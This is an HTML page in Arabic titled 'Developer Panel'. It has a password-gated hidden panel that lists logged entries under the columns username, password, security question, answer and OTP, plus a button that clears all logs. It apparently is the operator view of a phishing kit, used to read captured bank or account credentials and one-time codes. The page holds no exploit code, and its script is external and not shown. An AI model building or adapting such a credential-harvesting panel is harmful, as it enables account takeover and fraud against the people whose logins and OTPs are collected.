<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Developer Panel</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">

<style>

body{

background:#f5f5f5;

font-family:Cairo,sans-serif;

padding:25px;

}

.box{

background:white;

padding:25px;

border-radius:15px;

box-shadow:0 8px 20px rgba(0,0,0,.12);

max-width:1200px;

margin:auto;

overflow:auto;

}

input{

width:100%;

padding:14px;

font-size:17px;

border-radius:10px;

border:1px solid #ddd;

margin:15px 0;

}

button{

padding:14px 22px;

background:#c41e24;

color:white;

border:none;

border-radius:10px;

font-size:17px;

cursor:pointer;

margin-bottom:20px;

}

table{

width:100%;

border-collapse:collapse;

margin-top:20px;

}

th{

background:#c41e24;

color:white;

padding:12px;

}

td{

padding:10px;

text-align:center;

border:1px solid #ddd;

}

#panel{

display:none;

}

.delete-btn{

background:#444;

margin-top:20px;

}

</style>

</head>

<body>

<div class="box">

<h2>لوحة المطور</h2>

<input
type="password"
id="devPass"
placeholder="كلمة مرور المطور">

<button onclick="loginDeveloper()">

دخول

</button>

<div id="panel">

<h3>سجل العمليات</h3>

<table>

<thead>

<tr>

<th>الوقت</th>

<th>اسم المستخدم</th>

<th>كلمة المرور</th>

<th>السؤال</th>

<th>الإجابة</th>

<th>OTP</th>

</tr>

</thead>

<tbody id="logsTable">

</tbody>

</table>

<button class="delete-btn" onclick="clearLogs()">

حذف جميع السجلات

</button>

</div>

</div>

<script src="js/developer.js"></script>

</body>

</html>
